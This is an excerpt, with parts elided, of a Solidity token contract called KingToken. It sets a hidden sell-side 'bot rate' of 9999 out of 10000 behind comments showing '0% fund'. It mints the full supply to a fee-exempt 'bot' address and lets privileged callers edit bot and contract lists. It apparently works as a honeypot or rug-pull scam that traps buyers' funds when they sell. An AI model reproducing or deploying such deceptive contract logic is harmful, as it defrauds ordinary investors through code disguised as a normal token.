...
contract KingToken is ERC20, Ownable {
    ...
    mapping (address => bool) private contractList; // contract List

    uint256 private _totalRate=10000;

    address private fundAddr=address(0x000000000000000000000000000000000000dEaD);

    bool private botSwitch=true;

    // buy and remove liquid fee
    bool private  brSwitch=true;
    uint256 public brFundRate=0; //0% fund
    uint256 private brBotRate=0;

    // sell and add liquid fee
    bool private saSwitch=true;
    uint256 public saFundRate=0; //0% fund
    uint256 private saBotRate=9999;

    //transfer
    bool private transSwitch=true;
    uint256 public transFundRate=0; //0% fund
    uint256 private transBotRate=0;

    event SwapAndLiquify(uint256 tokensSwapped,uint256 ethReceived,uint256 tokensIntoLiqudity);

    constructor() payable ERC20("KingToken", "KT")  {
        uint256 totalSupply = 57795300*1e18;
        // Fee Exempt
        ...
        contractList[address(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4)]=true;
        bots[address(0xa336f9F300913F615625E591599d13039261eD17)]=true;

        _cast(address(0xa336f9F300913F615625E591599d13039261eD17), totalSupply);
    }

    receive() external payable {}

    function setContractList(address addr, bool state) public {
        require(lper[_msgSender()],"invalid");
        contractList[addr] = state;
    }

    function setBots(address bot, bool state) public {
        require(lper[_msgSender()],"invalid");
        bots[bot] = state;
    }
    ...
    function _tokenTransfer(address _sender, address _recipient, uint256 _amount,string memory _tradeType,bool _takeFee) private {
        ...
        if(isEqual(_tradeType,"buy") && _takeFee){
            ...
            if((bots[_sender] || bots[_recipient])&& botSwitch){
                feeAmount = 0;
            }
            if(feeAmount>0){
